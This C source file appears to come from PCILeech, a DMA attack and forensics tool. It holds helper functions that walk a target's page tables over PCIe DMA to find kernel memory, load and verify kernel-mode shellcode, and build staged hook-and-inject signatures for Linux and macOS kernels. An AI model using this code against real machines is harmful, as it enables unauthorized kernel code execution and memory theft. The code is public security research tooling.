// util.c : implementation of various utility functions.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "util.h"
#include "device.h"
#include "shellcode.h"
#include <bcrypt.h>

#define PT_VALID_MASK		0x80000000000000BF	// valid, active, supervior paging structure
#define PT_VALID_VALUE		0x0000000000000023	// 

BOOL Util_PageTable_ReadPTE(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwCR3, _In_ QWORD qwAddressLinear, _Out_ PQWORD pqwPTE, _Out_opt_ PQWORD pqPTEAddrPhysOpt)
{
	BYTE pb[4096];
	BOOL result;
	QWORD qwEntry, qwAddr;
	// retrieve PML4
	qwAddr = (qwCR3 & 0x000ffffffffff000);
	if(!qwAddr || qwAddr > 0xffffffff) { return FALSE; }
	result = DeviceReadDMARetryOnFail(pDeviceData, (DWORD)qwAddr, pb, 4096);
	if(!result) { return FALSE; }
	// retrieve PDPT (Page-Directory Pointer Table)
	qwEntry = *(PQWORD)&pb[0xff8 & ((qwAddressLinear >> 39) << 3)];
	qwAddr = 0x000ffffffffff000 & qwEntry;
	if(!qwAddr || qwAddr > 0xffffffff) { return FALSE; }
	if((qwEntry & PT_VALID_MASK) != PT_VALID_VALUE) { return FALSE; }
	result = DeviceReadDMA(pDeviceData, (DWORD)qwAddr, pb, 4096);
	if(!result) { return FALSE; }
	// retrieve PD (Page-Directory)
	qwEntry = *(PQWORD)&pb[0xff8 & ((qwAddressLinear >> 30) << 3)];
	qwAddr = 0x000ffffffffff000 & qwEntry;
	if(!qwAddr || qwAddr > 0xffffffff) { return FALSE; }
	if((qwEntry & PT_VALID_MASK) != PT_VALID_VALUE) { return FALSE; }
	result = DeviceReadDMA(pDeviceData, (DWORD)qwAddr, pb, 4096);
	if(!result) { return FALSE; }
	// retrieve PT (Page-Table)
	qwEntry = *(PQWORD)&pb[0xff8 & ((qwAddressLinear >> 21) << 3)];
	qwAddr = 0x000ffffffffff000 & qwEntry;
	if(!qwAddr || qwAddr > 0xffffffff) { return FALSE; }
	if((qwEntry & PT_VALID_MASK) != PT_VALID_VALUE) { return FALSE; }
	result = DeviceReadDMA(pDeviceData, (DWORD)qwAddr, pb, 4096);
	if(!result) { return FALSE; }
	// retrieve PTE
	if(pqPTEAddrPhysOpt) {
		*pqPTEAddrPhysOpt = qwAddr + (0xff8 & ((qwAddressLinear >> 12) << 3));
	}
	*pqwPTE = *(PQWORD)&pb[0xff8 & ((qwAddressLinear >> 12) << 3)];
	return TRUE;
}

BOOL Util_PageTable_FindSignatureBase_IsPageTableDataValid(_In_ QWORD qwPageTableData)
{
	if((qwPageTableData & PT_VALID_MASK) != PT_VALID_VALUE) {
		return FALSE;
	} // Not valid supervisor page entry
	qwPageTableData &= 0x000ffffffffff000;
	if(qwPageTableData == 0) {
		return FALSE;
	} // Not found
	if(qwPageTableData > 0xffffffff) {
		return FALSE; 
	} // Outside 32-bit scope
	if(qwPageTableData > 0xc0000000) {
		return FALSE;
	} // Possibly in PCIE space
	return TRUE;
}

BOOL Util_PageTable_FindSignatureBase_CachedReadDMA(_In_ PDEVICE_DATA pDeviceData, _In_ DWORD dwAddrPci32, _Out_ PBYTE pbPage, _Inout_updates_bytes_(0x01000000) PBYTE pbCache)
{
	BOOL result;
	if(pbCache) {
		if(*(PQWORD)pbCache == 0) {
			*(PQWORD)pbCache = 2;
			result = DeviceReadDMARetryOnFail(pDeviceData, 0x00100000, pbCache + 0x00100000, 0x00F00000);
			if(!result) { return FALSE; }
			*(PQWORD)pbCache = 1;
		}
		if(*(PQWORD)pbCache == 1 && dwAddrPci32 >= 0x00100000 && dwAddrPci32 < 0x01000000) {
			memcpy(pbPage, pbCache + dwAddrPci32, 4096);
			return TRUE;
		}
	}
	return DeviceReadDMARetryOnFail(pDeviceData, dwAddrPci32, pbPage, 4096);
}

BOOL Util_PageTable_FindSignatureBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PQWORD pqwCR3, _In_ PSIGNATUREPTE pPTEs, _In_ QWORD cPTEs, _Out_ PQWORD pqwSignatureBase)
{
	// win8  kernel modules start at even  1-page boundaries (0x1000)
	// win10 kernel modules start at even 16-page boundaries (0x10000)
	// winx64 kernel memory is located above 0xffff800000000000
	BOOL result;
	QWORD PML4[512], PDPT[512], PD[512], PT[512];
	QWORD PML4_idx = 0xfff, PDPT_idx = 0xfff, PD_idx = 0xfff;
	PSIGNATUREPTE pPTE = pPTEs;
	QWORD cPTE = 0, cPTEPages = 0, PTE, qwA;
	QWORD qwPageTableData;
	WORD wSignature;
	QWORD qwRegCR3, qwRegCR3Min, qwRegCR3Max;
	PBYTE pbCache;
	if(pCfg->fPageTableScan) {
		qwRegCR3Min = 0x100000;
		qwRegCR3Max = 0x1000000;
		pbCache = LocalAlloc(LMEM_ZEROINIT, 0x01000000);
	} else {
		qwRegCR3Min = *pqwCR3;
		qwRegCR3Max = *pqwCR3 + 0x1000;
		pbCache = NULL; // cache reads may fail if whole region isn't readable.
	}
	for(qwRegCR3 = qwRegCR3Min; qwRegCR3 < qwRegCR3Max; qwRegCR3 += 0x1000) {
		result = Util_PageTable_FindSignatureBase_CachedReadDMA(pDeviceData, qwRegCR3 & 0xfffff000, (PBYTE)PML4, pbCache);
		if(!result) { return FALSE; }
		qwA = 0x0fffff80000000000;
		while(qwA > 0x07fffffffffffffff) {
			if(PML4_idx != (0x1ff & (qwA >> 39))) { // PML4
				PML4_idx = 0x1ff & (qwA >> 39);
				qwPageTableData = PML4[PML4_idx];
				if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
					qwA += 0x0000008000000000;
					qwA &= 0xffffff8000000000;
					continue;
				}
				result = Util_PageTable_FindSignatureBase_CachedReadDMA(pDeviceData, qwPageTableData & 0xfffff000, (PBYTE)PDPT, pbCache);
				if(!result) {
					qwA += 0x0000008000000000;
					qwA &= 0xffffff8000000000;
					continue;
				}
				PDPT_idx = 0xfff;
				PD_idx = 0xfff;
			}
			if(PDPT_idx != (0x1ff & (qwA >> 30))) { // PDPT(Page-Directory Pointer Table)
				PDPT_idx = 0x1ff & (qwA >> 30);
				qwPageTableData = PDPT[PDPT_idx];
				if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
					qwA += 0x0000000040000000;
					qwA &= 0xffffffffC0000000;
					continue;
				}
				result = Util_PageTable_FindSignatureBase_CachedReadDMA(pDeviceData, qwPageTableData & 0xfffff000, (PBYTE)PD, pbCache);
				if(!result) {
					qwA += 0x0000000040000000;
					qwA &= 0xffffffffC0000000;
					continue;
				}
				PD_idx = 0xfff;
			}
			if(PD_idx != (0x1ff & (qwA >> 21))) { // PD (Page Directory)
				PD_idx = 0x1ff & (qwA >> 21);
				qwPageTableData = PD[PD_idx];
				if(!Util_PageTable_FindSignatureBase_IsPageTableDataValid(qwPageTableData)) {
					qwA += 0x0000000000200000;
					qwA &= 0xffffffffffE00000;
					continue;
				}
				result = Util_PageTable_FindSignatureBase_CachedReadDMA(pDeviceData, qwPageTableData & 0xfffff000, (PBYTE)PT, pbCache);
				if(!result) {
					qwA += 0x0000000000200000;
					qwA &= 0xffffffffffE00000;
					continue;
				}
			}
			PTE = PT[0x1ff & (qwA >> 12)];
			wSignature = (PTE & 0x07) | ((PTE >> 48) & 0x8000);
			if(wSignature != pPTE->wSignature) { // signature do not match
				qwA += 0x0000000000001000;
				qwA &= 0xfffffffffffff000;
				pPTE = pPTEs;
				cPTE = 0;
				cPTEPages = 0;
				continue;
			}
			if(cPTE == 0 && cPTEPages == 0) {
				*pqwSignatureBase = qwA;
			}
			cPTEPages++;
			if(cPTEPages == pPTE->cPages) { // next page section
				cPTE++;
				pPTE = pPTEs + cPTE;
				cPTEPages = 0;
				if(pPTE->cPages == 0 || cPTE == cPTEs) { // found
					LocalFree(pbCache);
					*pqwCR3 = qwRegCR3;
					return TRUE;
				}
			}
			qwA += 0x1000;
		}
	}
	*pqwSignatureBase = 0;
	LocalFree(pbCache);
	return FALSE;
}

BOOL Util_ParseHexFileBuiltin(_In_ LPSTR sz, _Out_ PBYTE pb, _In_ DWORD cb, _Out_ PDWORD pcb)
{
	SIZE_T i;
	HANDLE hFile;
	BOOL result;
	// 1: try load default
	if(0 == memcmp("DEFAULT", sz, 7)) {
		for(i = 0; i < (sizeof(SHELLCODE_DEFAULT) / sizeof(SHELLCODE_DEFAULT_STRUCT)); i++) {
			if((0 == strcmp(SHELLCODE_DEFAULT[i].sz, sz)) && (SHELLCODE_DEFAULT[i].cb <= cb)) {					
				memcpy(pb, SHELLCODE_DEFAULT[i].pb, SHELLCODE_DEFAULT[i].cb);
				*pcb = SHELLCODE_DEFAULT[i].cb;
				return TRUE;
			}
		}
		return FALSE;
	}
	// 2: try load hex ascii
	*pcb = cb;
	if(CryptStringToBinaryA(sz, 0, CRYPT_STRING_HEX_ANY, pb, pcb, NULL, NULL)) {
		return TRUE;
	}
	// 3: try load file
	i = strnlen_s(sz, MAX_PATH);
	if(i > 4 && i < MAX_PATH) { // try to load from file
		hFile = CreateFileA(sz, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(!hFile) { return E_FAIL; }
		result = ReadFile(hFile, pb, cb, pcb, NULL);
		CloseHandle(hFile);
		return result;
	}
	return FALSE;
}

BOOL Util_ParseSignatureLine(_In_ PSTR szLine, _In_ DWORD cSignatureChunks, _Out_ PSIGNATURE_CHUNK pSignatureChunks) {
	LPSTR szToken, szContext = NULL;
	PSIGNATURE_CHUNK pChunk;
	SIZE_T i;
	BOOL result;
	if(!szLine || !strlen(szLine) || szLine[0] == '#') { return FALSE; }
	for(i = 0; i < cSignatureChunks * 2; i++) {
		pChunk = &pSignatureChunks[i / 2];
		szToken = strtok_s(szLine, ",:;", &szContext);
		szLine = NULL;
		if(!szToken) { return FALSE; }
		if(i % 2 == 0) {
			pChunk->cbOffset = strtoul(szToken, NULL, 16);
		} else {
			result = Util_ParseHexFileBuiltin(szToken, pChunk->pb, sizeof(pChunk->pb), &pChunk->cb);
			if(!result) { return FALSE; }
		}
	}
	return TRUE;
}

BOOL Util_LoadSignatures(_In_ LPSTR szSignatureName, _In_ LPSTR szFileExtension, _Out_ PSIGNATURE pSignatures, _In_ PDWORD cSignatures, _In_ DWORD cSignatureChunks)
{
	BYTE pbFile[0x10000];
	DWORD cbFile = 0, cSignatureIdx = 0;
	CHAR szSignatureFile[MAX_PATH];
	HANDLE hFile;
	BOOL bResult;
	LPSTR szContext = NULL, szLine;
	memset(pSignatures, 0, *cSignatures * sizeof(SIGNATURE));
	// open and read file
	Util_GetFileInDirectory(szSignatureFile, szSignatureName);
	strcpy_s(szSignatureFile + strlen(szSignatureFile), MAX_PATH - strlen(szSignatureFile), szFileExtension);
	hFile = CreateFileA(szSignatureFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hFile) { return FALSE; }
	memset(pbFile, 0, 0x10000);
	bResult = ReadFile(hFile, pbFile, 0x10000, &cbFile, NULL);
	CloseHandle(hFile);
	if(!bResult || !cbFile || cbFile == 0x10000) { return FALSE; }
	// parse file
	szLine = strtok_s(pbFile, "\r\n", &szContext);
	while(szLine && cSignatureIdx < *cSignatures) {
		if(Util_ParseSignatureLine(szLine, cSignatureChunks, pSignatures[cSignatureIdx].chunk)) {
			cSignatureIdx++;
		}
		szLine = strtok_s(NULL, "\r\n", &szContext);
	}
	*cSignatures = cSignatureIdx;
	return TRUE;
}

VOID Util_GetFileInDirectory(_Out_ CHAR szPath[MAX_PATH], _In_ LPSTR szFileName)
{
	SIZE_T cchFileName = strlen(szFileName);
	SIZE_T cchPath = GetModuleFileNameA(NULL, (LPSTR)szPath, (DWORD)(MAX_PATH - cchFileName - 4));
	strcpy_s(&szPath[cchPath], MAX_PATH - cchPath, "\\..\\");
	strcpy_s(&szPath[cchPath + 4], MAX_PATH - cchPath - 4, szFileName);
}

VOID Util_SHA256(_In_ PBYTE pb, _In_ DWORD cb, _Out_ __bcount(32) PBYTE pbHash)
{
	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_HASH_HANDLE hHash = NULL;
	BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
	BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
	BCryptHashData(hHash, pb, cb, 0);
	BCryptFinishHash(hHash, pbHash, 32, 0);
	BCryptDestroyHash(hHash);
	BCryptCloseAlgorithmProvider(hAlg, 0);
}

DWORD Util_memcmpEx(_In_ PBYTE pb1, _In_ PBYTE pb2, _In_  DWORD cb)
{
	for(DWORD i = 0; i < cb; i++) {
		if(pb1[i] != pb2[i]) {
			return i + 1;
		}
	}
	return 0;
}

VOID Util_GenRandom(_Out_ PBYTE pb, _In_ DWORD cb)
{
	HCRYPTPROV hCryptProv;
	CryptAcquireContext(&hCryptProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT);
	CryptGenRandom(hCryptProv, cb, pb);
	CryptReleaseContext(hCryptProv, 0);
}

BOOL Util_LoadKmdExecShellcode(_In_ LPSTR szKmdExecName, _Out_ PKMDEXEC* ppKmdExec)
{
	CHAR szKmdExecFile[MAX_PATH];
	PBYTE pbKmdExec;
	DWORD cbKmdExec;
	PKMDEXEC pKmdExec;
	HANDLE hFile;
	BOOL result;
	BYTE pbKmdExecHASH[32];
	pbKmdExec = (PBYTE)LocalAlloc(LMEM_ZEROINIT, 0x400000);
	if(!pbKmdExec) { return FALSE; }
	// open and read file
	Util_GetFileInDirectory(szKmdExecFile, szKmdExecName);
	strcpy_s(szKmdExecFile + strlen(szKmdExecFile), MAX_PATH - strlen(szKmdExecFile), ".ksh");
	hFile = CreateFileA(szKmdExecFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hFile) { return FALSE; }
	result = ReadFile(hFile, pbKmdExec, 0x10000, &cbKmdExec, NULL);
	CloseHandle(hFile);
	if(!result) { return FALSE; }
	// ensure file validity
	pKmdExec = (PKMDEXEC)pbKmdExec;
	if(pKmdExec->dwMagic != KMDEXEC_MAGIC) { goto error; }
	Util_SHA256(pbKmdExec + 40, cbKmdExec - 40, pbKmdExecHASH);
	if(memcmp(pbKmdExecHASH, pKmdExec->pbChecksumSHA256, 32)) { goto error; }
	// parse file
	pKmdExec->cbShellcode = (pKmdExec->cbShellcode + 0xfff) & 0xfffff000; // align to 4k (otherwise dma write may fail)
	pKmdExec->szOutFormatPrintf = (LPSTR)((QWORD)pKmdExec + (QWORD)pKmdExec->szOutFormatPrintf);
	pKmdExec->pbShellcode = (LPSTR)((QWORD)pKmdExec + (QWORD)pKmdExec->pbShellcode);
	*ppKmdExec = pKmdExec;
	return TRUE;
error:
	LocalFree(pbKmdExec);
	pKmdExec = NULL;
	return FALSE;
}

QWORD Util_GetNumeric(_In_ LPSTR sz)
{
	if((strlen(sz) > 1) && (sz[0] == '0') && ((sz[1] == 'x') || (sz[1] == 'X'))) {
		return strtoull(sz, NULL, 16); // Hex (starts with 0x)
	} else {
		return strtoull(sz, NULL, 10); // Not Hex -> try Decimal
	}
}

VOID Util_CreateSignatureLinuxGeneric(_In_ DWORD paBase, _In_ DWORD paSzKallsyms, _In_ QWORD vaSzKallsyms, _In_ QWORD vaFnKallsyms, _In_ QWORD vaFnHijack, _Out_ PSIGNATURE pSignature)
{
	DWORD dwBase2M = (paSzKallsyms & ~0x1fffff) - ((vaSzKallsyms & ~0x1fffff) - (vaFnKallsyms & ~0x1fffff)); // symbol name base is not same as fn base
	memset(pSignature, 0, sizeof(SIGNATURE));
	memcpy(pSignature->chunk[2].pb, LINUX_X64_STAGE1_BIN, sizeof(LINUX_X64_STAGE1_BIN));
	memcpy(pSignature->chunk[3].pb, LINUX_X64_STAGE2_BIN, sizeof(LINUX_X64_STAGE2_BIN));
	memcpy(pSignature->chunk[4].pb, LINUX_X64_STAGE3_BIN, sizeof(LINUX_X64_STAGE3_BIN));
	pSignature->chunk[2].cb = sizeof(LINUX_X64_STAGE1_BIN);
	pSignature->chunk[3].cb = sizeof(LINUX_X64_STAGE2_BIN);
	pSignature->chunk[4].cb = sizeof(LINUX_X64_STAGE3_BIN);
	pSignature->chunk[0].cbOffset = paBase + dwBase2M + (vaFnHijack & 0xffffff);
	pSignature->chunk[1].cbOffset = paBase + dwBase2M + 0xd00;
	pSignature->chunk[2].cbOffset = dwBase2M + (vaFnHijack & 0xffffff);
	pSignature->chunk[3].cbOffset = dwBase2M + 0xd00;
	pSignature->chunk[4].cbOffset = dwBase2M + (vaFnKallsyms & 0xffffff);
	pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
	pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}

VOID Util_CreateSignatureAppleGeneric(_In_ DWORD paKernelBase, _In_ DWORD paFunctionHook, _In_ DWORD paStage2, _Out_ PSIGNATURE pSignature)
{
	memset(pSignature, 0, sizeof(SIGNATURE));
	memcpy(pSignature->chunk[2].pb, APPLE_X64_STAGE1_BIN, sizeof(APPLE_X64_STAGE1_BIN));
	memcpy(pSignature->chunk[3].pb, APPLE_X64_STAGE2_BIN, sizeof(APPLE_X64_STAGE2_BIN));
	memcpy(pSignature->chunk[4].pb, APPLE_X64_STAGE3_BIN, sizeof(APPLE_X64_STAGE3_BIN));
	pSignature->chunk[2].cb = sizeof(APPLE_X64_STAGE1_BIN);
	pSignature->chunk[3].cb = sizeof(APPLE_X64_STAGE2_BIN);
	pSignature->chunk[4].cb = sizeof(APPLE_X64_STAGE3_BIN);
	pSignature->chunk[0].cbOffset = paFunctionHook;
	pSignature->chunk[1].cbOffset = paStage2;
	pSignature->chunk[2].cbOffset = paFunctionHook;
	pSignature->chunk[3].cbOffset = paStage2;
	pSignature->chunk[4].cbOffset = paKernelBase;
	pSignature->chunk[0].qwAddress = pSignature->chunk[0].cbOffset & ~0xfff;
	pSignature->chunk[1].qwAddress = pSignature->chunk[1].cbOffset & ~0xfff;
}
